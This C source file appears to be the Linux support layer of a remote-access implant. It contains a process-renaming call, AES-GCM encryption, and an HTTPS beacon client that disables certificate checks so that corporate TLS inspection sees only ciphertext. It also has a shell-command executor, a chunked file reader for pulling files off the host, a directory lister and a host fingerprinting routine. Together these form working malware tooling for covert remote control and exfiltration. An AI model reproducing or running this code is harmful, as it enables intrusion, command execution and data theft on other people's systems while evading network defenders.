#define _GNU_SOURCE
#include "port.h"

#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <pwd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <time.h>
#include <unistd.h>

int sys_init(void) { return 0; }
void sys_shutdown(void) {}

/* Kernel copies the name immediately (task comm, max 15 bytes). */
void sys_set_procname(const char *name) {
    prctl(PR_SET_NAME, name, 0, 0, 0);
}

void rand_bytes(unsigned char *out, size_t n) {
    if (RAND_bytes(out, (int)n) != 1) exit(1);
}

int sha256(const unsigned char *in, size_t n, unsigned char out[32]) {
    return EVP_Digest(in, n, out, NULL, EVP_sha256(), NULL) == 1 ? 0 : -1;
}

int aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *pt, size_t pt_len,
                 unsigned char *ct, size_t ct_len, unsigned char tag[16]) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, ok = 0;
    if (!ctx || ct_len < pt_len) goto done;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) goto done;
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) goto done;
    if (EVP_EncryptUpdate(ctx, ct, &outl, pt, (int)pt_len) != 1) goto done;
    if (EVP_EncryptFinal_ex(ctx, ct + pt_len, &outl) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) goto done;
    ok = 1;
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok ? 0 : -1;
}

int aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                 unsigned char *pt, size_t pt_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, ok = 0;
    if (!ctx || pt_len < ct_len) goto done;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) goto done;
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) goto done;
    if (EVP_DecryptUpdate(ctx, pt, &outl, ct, (int)ct_len) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void *)tag) != 1) goto done;
    if (EVP_DecryptFinal_ex(ctx, pt + ct_len, &outl) != 1) goto done; /* tag mismatch fails here */
    ok = 1;
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok ? 0 : -1;
}

uint64_t now_unix(void) { return (uint64_t)time(NULL); }

void sleep_sec(double s) {
    struct timespec ts;
    ts.tv_sec = (time_t)s;
    ts.tv_nsec = (long)((s - (double)ts.tv_sec) * 1e9);
    if (ts.tv_nsec < 0) ts.tv_nsec = 0;
    nanosleep(&ts, NULL);
}

static int parse_url(const char *url, char *host, size_t host_sz, int *port, char *path, size_t path_sz) {
    const char *p, *slash, *colon;
    size_t hl;
    if (strncmp(url, "https://", 8) != 0) return -1;
    p = url + 8;
    slash = strchr(p, '/');
    colon = strchr(p, ':');
    if (colon && (!slash || colon < slash)) {
        hl = (size_t)(colon - p);
        *port = atoi(colon + 1);
    } else {
        hl = slash ? (size_t)(slash - p) : strlen(p);
        *port = 443;
    }
    if (hl == 0 || hl >= host_sz) return -1;
    memcpy(host, p, hl);
    host[hl] = '\0';
    snprintf(path, path_sz, "%s", slash ? slash : "/");
    return 0;
}

int http_post(const char *url, const char *ua, const char *body, size_t body_len,
              long *status_code, char **resp, size_t *resp_len) {
    char host[256], path[512], portstr[8], hosthdr[280];
    struct addrinfo hints, *res = NULL, *ai;
    int port = 443, sock = -1, ret = -1, n;
    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    char *buf = NULL, *out = NULL;
    size_t cap = 8192, len = 0, head = 0, blen = 0, clen = 0;
    int have_clen = 0;

    if (parse_url(url, host, sizeof host, &port, path, sizeof path) != 0) return -1;
    snprintf(portstr, sizeof portstr, "%d", port);
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, portstr, &hints, &res) != 0) return -1;
    for (ai = res; ai; ai = ai->ai_next) {
        sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (sock < 0) continue;
        if (connect(sock, ai->ai_addr, ai->ai_addrlen) == 0) break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);
    if (sock < 0) return -1;

    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) goto done;
    /* Cert validation is intentionally off: the AEAD key authenticates the
       server and enterprise TLS inspection only yields ciphertext. */
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    ssl = SSL_new(ctx);
    if (!ssl) goto done;
    {
        static const unsigned char alpn[] = {8, 'h', 't', 't', 'p', '/', '1', '.', '1'};
        SSL_set_alpn_protos(ssl, alpn, sizeof alpn);
    }
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) != 1) goto done;

    if (port == 443) snprintf(hosthdr, sizeof hosthdr, "%s", host);
    else snprintf(hosthdr, sizeof hosthdr, "%s:%d", host, port);
    {
        size_t req_cap = strlen(path) + strlen(hosthdr) + strlen(ua) + body_len + 256;
        char *req = (char *)malloc(req_cap);
        if (!req) goto done;
        n = snprintf(req, req_cap,
                     "POST %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: application/json\r\n"
                     "Accept-Language: en-US,en\r\n"
                     "Content-Type: application/json\r\n"
                     "Content-Length: %zu\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     path, hosthdr, ua, body_len);
        if (SSL_write(ssl, req, n) != n) { free(req); goto done; }
        free(req);
    }
    if (SSL_write(ssl, body, (int)body_len) != (int)body_len) goto done;

    buf = (char *)malloc(cap);
    if (!buf) goto done;
    for (;;) {
        int r;
        char *grown;
        size_t ncap, room;
        if (len >= (size_t)WIRE_MAX) break;
        if (len + 4096 > cap) {
            ncap = cap > (size_t)WIRE_MAX / 2 ? (size_t)WIRE_MAX : cap * 2;
            if (ncap <= len) break;
            grown = (char *)realloc(buf, ncap);
            if (!grown) goto done; /* buf 仍指向原块，done 里会释放 */
            buf = grown;
            cap = ncap;
        }
        room = cap - len;
        if (room > (size_t)WIRE_MAX - len) room = (size_t)WIRE_MAX - len;
        r = SSL_read(ssl, buf + len, (int)room);
        if (r <= 0) break;
        len += (size_t)r;
    }
    if (len < 15 || strncmp(buf, "HTTP/1.", 7) != 0) goto done;
    *status_code = strtol(buf + 9, NULL, 10);

    /* header/body split */
    for (head = 0; head + 3 < len; head++) {
        if (buf[head] == '\r' && buf[head + 1] == '\n' && buf[head + 2] == '\r' && buf[head + 3] == '\n') break;
    }
    if (head + 3 >= len) goto done;
    head += 4;

    /* honor Content-Length when present, else read-to-EOF semantics */
    {
        const char *h = buf, *hend = buf + head - 4;
        while (h < hend) {
            const char *eol = (const char *)memchr(h, '\n', (size_t)(hend - h));
            if (!eol) break;
            if (strncasecmp(h, "Content-Length:", 15) == 0) {
                clen = (size_t)strtoul(h + 15, NULL, 10);
                have_clen = 1;
            }
            h = eol + 1;
        }
    }
    if (have_clen) blen = clen <= len - head ? clen : len - head;
    else blen = len - head;
    if (blen > RESP_MAX_BODY) blen = RESP_MAX_BODY;

    out = (char *)malloc(blen ? blen : 1);
    if (!out) goto done;
    memcpy(out, buf + head, blen);
    *resp = out;
    *resp_len = blen;
    ret = 0;
done:
    if (ret != 0) free(out);
    free(buf);
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
    if (ctx) SSL_CTX_free(ctx);
    /* 失败记录留在队列里会一次次回连越积越多。 */
    ERR_clear_error();
    if (sock >= 0) close(sock);
    return ret;
}

static void reap_group(pid_t pid, int *st, int *reaped) {
    if (*reaped) return;
    /* 已经是僵尸就直接收，避免 pid 被系统复用后 kill 到别人。 */
    if (waitpid(pid, st, WNOHANG) == pid) {
        *reaped = 1;
        return;
    }
    if (kill(-pid, SIGKILL) != 0) kill(pid, SIGKILL);
    while (waitpid(pid, st, 0) < 0 && errno == EINTR) {}
    *reaped = 1;
}

int exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code) {
    int fds[2], st = 0, reaped = 0;
    pid_t pid;
    unsigned char *buf;
    size_t cap = 8192, len = 0;
    time_t deadline;

    if (timeout_sec <= 0 || timeout_sec > 600) timeout_sec = 30;
    if (pipe(fds) != 0) return -1;
    pid = fork();
    if (pid < 0) {
        close(fds[0]);
        close(fds[1]);
        return -1;
    }
    if (pid == 0) {
        setpgid(0, 0);
        dup2(fds[1], 1);
        dup2(fds[1], 2);
        close(fds[0]);
        close(fds[1]);
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    setpgid(pid, pid);
    close(fds[1]);
    fcntl(fds[0], F_SETFL, O_NONBLOCK);
    buf = (unsigned char *)malloc(cap);
    deadline = time(NULL) + timeout_sec;
    while (buf && len < (size_t)OUT_CAP && time(NULL) < deadline) {
        ssize_t n;
        if (len == cap) {
            size_t ncap = cap * 2;
            unsigned char *grown;
            if (ncap > (size_t)OUT_CAP + 1) ncap = (size_t)OUT_CAP + 1;
            if (ncap <= cap) break;
            grown = (unsigned char *)realloc(buf, ncap);
            if (!grown) break;
            buf = grown;
            cap = ncap;
        }
        n = read(fds[0], buf + len, cap - len);
        if (n > 0) {
            len += (size_t)n;
            continue;
        }
        if (n < 0 && errno == EINTR) continue;
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            fd_set rfds;
            struct timeval tv;
            pid_t wr = waitpid(pid, &st, WNOHANG);
            if (wr == pid) reaped = 1;
            if (reaped) break;
            FD_ZERO(&rfds);
            FD_SET(fds[0], &rfds);
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            if (select(fds[0] + 1, &rfds, NULL, NULL, &tv) < 0 && errno != EINTR) break;
            continue;
        }
        break; /* EOF or hard read error */
    }
    /* 子进程退出和最后一块输出之间有空隙，关管道前再抽干。 */
    while (buf && len < (size_t)OUT_CAP) {
        ssize_t n;
        if (len == cap) break;
        n = read(fds[0], buf + len, cap - len);
        if (n > 0) { len += (size_t)n; continue; }
        break;
    }
    /* 超时、输出到顶或读失败时先杀掉整组，再 wait，避免子进程堵在管道上变成僵尸。 */
    reap_group(pid, &st, &reaped);
    close(fds[0]);
    if (!buf) return -1;
    if (WIFEXITED(st)) *exit_code = WEXITSTATUS(st);
    else if (WIFSIGNALED(st)) *exit_code = 128 + WTERMSIG(st);
    else *exit_code = -1;
    *out = buf;
    *out_len = len > (size_t)OUT_CAP ? (size_t)OUT_CAP : len;
    return 0;
}

int read_file_chunk(const char *path, uint32_t offset, unsigned char **out, size_t *out_len, uint32_t *total, int *err_code) {
    struct stat st;
    size_t want, got = 0;
    unsigned char *buf;
    int fd;

    *out = NULL;
    *out_len = 0;
    *total = 0;
    fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        *err_code = errno == ENOENT ? 1 : 2;
        return 0;
    }
    if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size < 0) {
        close(fd);
        *err_code = 2;
        return 0;
    }
    if (st.st_size > FILE_MAX) {
        close(fd);
        *err_code = 3;
        return 0;
    }
    *total = (uint32_t)st.st_size;
    if (offset > *total) {
        close(fd);
        *err_code = 4;
        return 0;
    }
    if (offset == *total) {
        close(fd);
        *err_code = 0;
        return 0;
    }
    if (lseek(fd, (off_t)offset, SEEK_SET) != (off_t)offset) {
        close(fd);
        *err_code = 2;
        return 0;
    }
    want = (size_t)FILE_CHUNK;
    if (want > *total - offset) want = *total - offset;
    buf = (unsigned char *)malloc(want ? want : 1);
    if (!buf) { close(fd); *err_code = 2; return 0; }
    while (got < want) {
        ssize_t r = read(fd, buf + got, want - got);
        if (r < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (r == 0) break;
        got += (size_t)r;
    }
    close(fd);
    if (got == 0 && want > 0) {
        free(buf);
        *err_code = 4;
        return 0;
    }
    *out = buf;
    *out_len = got;
    *err_code = 0;
    return 0;
}

static void put_u64le(unsigned char *p, uint64_t v) {
    int i;
    for (i = 0; i < 8; i++) p[i] = (unsigned char)(v >> (8 * i));
}

static void put_u16le(unsigned char *p, uint16_t v) {
    p[0] = (unsigned char)(v & 0xff);
    p[1] = (unsigned char)((v >> 8) & 0xff);
}

int list_dir(const char *path, unsigned char **out, size_t *out_len, int *err_code, int *truncated) {
    DIR *d;
    struct dirent *de;
    unsigned char *buf;
    size_t len = 0, pl;
    int trunc = 0;

    *out = NULL;
    *out_len = 0;
    *truncated = 0;
    if (!path || !path[0]) path = ".";
    d = opendir(path);
    if (!d) {
        *err_code = errno == ENOENT ? 1 : (errno == ENOTDIR ? 3 : 2);
        return 0;
    }
    buf = (unsigned char *)malloc(DIR_LIST_CAP);
    if (!buf) {
        closedir(d);
        *err_code = 2;
        return 0;
    }
    pl = strlen(path);
    while ((de = readdir(d)) != NULL) {
        const char *name = de->d_name;
        size_t nl = strlen(name), need, flen;
        char *full;
        struct stat st;
        uint64_t size, mtime;

        if (nl == 1 && name[0] == '.') continue;
        if (nl == 2 && name[0] == '.' && name[1] == '.') continue;
        need = 1 + 8 + 8 + 2 + nl;
        if (len + need > DIR_LIST_CAP) {
            trunc = 1;
            break;
        }
        full = (char *)malloc(pl + 1 + nl + 1);
        if (!full) {
            trunc = 1;
            break;
        }
        memcpy(full, path, pl);
        flen = pl;
        if (pl && path[pl - 1] != '/') full[flen++] = '/';
        memcpy(full + flen, name, nl);
        flen += nl;
        full[flen] = '\0';
        if (stat(full, &st) != 0) {
            free(full);
            continue; /* 打不开的条目（坏软链等）跳过，不冒充成功 */
        }
        free(full);
        buf[len] = S_ISDIR(st.st_mode) ? 1 : 0;
        size = (uint64_t)st.st_size;
        mtime = st.st_mtime < 0 ? 0 : (uint64_t)st.st_mtime;
        put_u64le(buf + len + 1, size);
        put_u64le(buf + len + 9, mtime);
        put_u16le(buf + len + 17, (uint16_t)nl);
        memcpy(buf + len + 19, name, nl);
        len += need;
    }
    closedir(d);
    *out = buf;
    *out_len = len;
    *truncated = trunc;
    *err_code = 0;
    return 0;
}

void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid) {
    struct utsname u;
    gethostname(hostname, hn - 1);
    hostname[hn - 1] = '\0';
    {
        struct passwd *pw = getpwuid(geteuid());
        if (pw && pw->pw_name) snprintf(username, un, "%s", pw->pw_name);
        else {
            const char *e = getenv("USER");
            snprintf(username, un, "%s", e ? e : "");
        }
    }
    if (uname(&u) == 0) {
        snprintf(os, on, "%s %s", u.sysname, u.release);
        if (strcmp(u.machine, "x86_64") == 0) snprintf(arch, an, "amd64");
        else if (strcmp(u.machine, "aarch64") == 0) snprintf(arch, an, "arm64");
        else snprintf(arch, an, "%s", u.machine);
    } else {
        snprintf(os, on, "Linux");
        snprintf(arch, an, "amd64");
    }
    *pid = (uint32_t)getpid();
}
